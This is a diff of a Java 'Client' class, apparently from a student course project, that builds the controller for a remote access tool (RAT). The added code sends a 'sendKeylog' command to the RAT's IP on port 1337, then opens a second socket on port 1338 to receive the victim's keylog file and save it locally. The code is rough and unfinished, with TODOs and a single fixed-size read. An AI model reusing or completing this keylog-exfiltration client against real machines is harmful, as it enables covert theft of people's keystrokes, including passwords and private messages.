@@ -1,14 +1,10 @@
 package edu.wit.comp2100;
 
-import java.io.DataOutputStream;
-import java.io.File;
-import java.io.IOException;
-import java.io.OutputStream;
-import java.net.Inet4Address;
+import java.io.*;
 import java.net.InetAddress;
+import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.UnknownHostException;
-import java.nio.file.Path;
 
 public class Client {
 
@@ -19,7 +15,7 @@ public class Client {
     private InetAddress RAT_IP;
     private boolean isActive;
     private File lastRecievedFile, keyLogFile;
-    private final int DEFAULT_RAT_PORT = 1337; //TODO decide on default port for rat client
+    private final int DEFAULT_PORT = 1337; //TODO decide on default port for rat client
 
     private Client() throws UnknownHostException {
         /*
@@ -39,7 +35,7 @@ public class Client {
     /*
     reads input and performs actions
      */
-    public void parseCommand(String[] command){
+    public void parseCommand(String[] command) throws IOException{
 
         //make sure arguments provided for "client" command
         try{
@@ -62,14 +58,14 @@ public class Client {
 
     }
 
-    private void parsePull(String[] command){
+    private void parsePull(String[] command) throws IOException{
 
         //make sure arguments provided for "client pull" command
         try{
             String[] nextPart = breakOffFirstPart(command);
             switch (command[0]){
                 case "keyLog":
-                    this.keyLogFile = this.pullKeylog();
+                    pullKeylog();
                     System.out.println("Keylog file pulled, stored in Client1.keyLogFile");
                     break;
                 default :
@@ -100,25 +96,35 @@ public class Client {
     If our communication with the RAT times out at any stage, throw an exception and return null.
     our timeout should be about 2-5 seconds waiting for a reply
      */
-    public File pullFile(String pathToFile){
+    public void pullFile(String pathToFile) throws IOException{
         //TODO implement this method
-        /*
-        Steps:
-        send request to client
-        recieve file
-        return file
-         */
         sendFileRequest();
-        return null;
+        recieveFile();
     }
+
+    public void recieveFile()throws IOException{
+        String filename = clientName + " KeyLog.txt";
+
+        Socket socket = new Socket(RAT_IP, 1338);
+        InputStream inputStream = socket.getInputStream();
+
+        FileOutputStream fileOutputStream = new FileOutputStream(filename);
+
+        byte[] bytes = new byte[1024];
+        inputStream.read(bytes, 0, bytes.length);
+        fileOutputStream.write(bytes, 0, bytes.length);
+        socket.close();
+    }
+
 
     //right now just sends generic request for keylogger
     private void sendFileRequest(){
         try{
-            Socket socket = new Socket(this.RAT_IP, this.DEFAULT_RAT_PORT);
+            Socket socket = new Socket(this.RAT_IP, this.DEFAULT_PORT);
             OutputStream outStream = socket.getOutputStream();
             DataOutputStream dataOutStream = new DataOutputStream(outStream);
-            dataOutStream.writeUTF("COMMAND");
+            dataOutStream.writeUTF("sendKeylog");
+            socket.close();
         }catch (IOException io){
             System.err.println("io exception attempting to send request for keyLog.txt");
         }
@@ -126,13 +132,13 @@ public class Client {
     }
 
 
-    public File pullKeylog(){
+    public void pullKeylog() throws IOException{
         /*
         TODO: decide - we could do it this way, or this could be an independent method that sends a text
             command and waits for a file after. text command could be something like "pushKeyLog"
          */
         String keylogPath = "keyLog.txt";
-        return pullFile(keylogPath);
+        pullFile(keylogPath);
     }
 
     public String getClientName(){
